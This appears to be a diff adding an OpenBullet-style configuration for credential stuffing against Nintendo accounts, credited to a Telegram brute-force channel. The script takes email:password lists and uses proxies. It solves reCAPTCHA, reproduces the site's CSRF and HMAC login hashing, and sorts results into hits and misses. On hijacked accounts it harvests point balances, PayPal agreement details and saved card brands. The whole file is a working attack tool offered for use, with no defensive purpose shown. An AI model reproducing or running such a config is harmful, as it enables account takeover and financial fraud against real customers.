@@ -1,0 +1,199 @@
+[SETTINGS]
+{
+  "Name": "Nintendo.com",
+  "SuggestedBots": 20,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-01T21:18:32.9348307+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Need Captcha Solver | Capture | CPM Rate: 10_100",
+  "Author": "@TheOwn",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.nintendo.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: /" 
+
+#csrf PARSE "<SOURCE>" LR "loginCsrfToken&quot;:&quot;" "&quot" -> VAR "csrf" 
+
+RECAPTCHA "https://accounts.nintendo.com/login" "6Lc7Bx4UAAAAAA5F2MPRC41fp6MnhS9D77vUlTXh" -> VAR "recaptcha" 
+
+#length1 FUNCTION Length "<csrf>" -> VAR "length" 
+
+#start FUNCTION Compute "<length>-8" -> VAR "start" 
+
+#salt FUNCTION Substring "<start>" "8" "<csrf>" -> VAR "salt" 
+
+#hup FUNCTION HMAC SHA256 "<salt>" "<USER>:<PASS>:<csrf>" -> VAR "hup" 
+
+#h FUNCTION ToLowercase "<hup>" -> VAR "h" 
+
+REQUEST POST "https://accounts.nintendo.com/login" 
+  CONTENT "post_login_redirect_uri=https%3A%2F%2Faccounts.nintendo.com%2F&redirect_after=5&display=&subject_id=<USER>&subject_password=<PASS>&g-recaptcha-response=<recaptcha>&csrf_token=<csrf>&_h=<h>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: /" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "logoutConfirmActionUri&quot;:&quot;/logout&quot" 
+  KEYCHAIN Failure OR 
+    KEY "The e-mail address/sign-in ID or password is incorrect" 
+    KEY "L'adresse e-mail/identifiant de connexion ou le mot de passe est incorrect." 
+  KEYCHAIN Ban OR 
+    KEY "The request contain an error" 
+
+#REQUEST1 REQUEST GET "https://ec.nintendo.com/my/" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "Host: ec.nintendo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Referer: https://accounts.nintendo.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Location1 FUNCTION Constant "<HEADERS(Location)>" -> VAR "Location1" 
+
+#REQUEST2 REQUEST GET "<Location1>" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "Host: accounts.nintendo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Referer: https://accounts.nintendo.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Location2 FUNCTION Constant "<HEADERS(Location)>" -> VAR "Location2" 
+
+#Location2 FUNCTION Replace "#code=" "?redirected=1&code=" "<Location2>" -> VAR "Location2" 
+
+REQUEST GET "<Location2>" AcceptEncoding=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#REQUEST_GOLD REQUEST GET "https://ec.nintendo.com/api/my/point" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "Host: ec.nintendo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://ec.nintendo.com/my/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#gold_point PARSE "<SOURCE>" JSON "gold_point" CreateEmpty=FALSE -> CAP "gold_point" 
+
+#REQUEST_Balance REQUEST GET "https://ec.nintendo.com/api/balance_info" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "Host: ec.nintendo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://ec.nintendo.com/my/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#raw_value PARSE "<SOURCE>" JSON "raw_value" CreateEmpty=FALSE -> CAP "raw_value" 
+
+#currency PARSE "<SOURCE>" JSON "currency" CreateEmpty=FALSE -> CAP "currency" 
+
+#REQUEST_PAYPAL REQUEST GET "https://ec.nintendo.com/api/paypal/agreements" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "Host: ec.nintendo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Referer: https://accounts.nintendo.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#pp_agreement_id PARSE "<SOURCE>" LR "pp_agreement_id\":\"" "\",\"" CreateEmpty=FALSE -> CAP "pp_agreement_id" 
+
+#pp_country_code PARSE "<SOURCE>" JSON "pp_country_code" CreateEmpty=FALSE -> CAP "pp_country_code" 
+
+#REQUEST_CARDS REQUEST GET "https://ec.nintendo.com/api/balance/credit_card" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "Host: ec.nintendo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://ec.nintendo.com/my/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#cards PARSE "<SOURCE>" JSON "brand" CreateEmpty=FALSE -> CAP "cc_type" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"cards\":[]}" 
+    KEY "{\"agreements\":[]}" 
+  KEYCHAIN Success OR 
+    KEY "{\"cards\":[{\"brand\":\"" 
+  KEYCHAIN Retry OR 
+    KEY "Please sign in again to continue" 
+
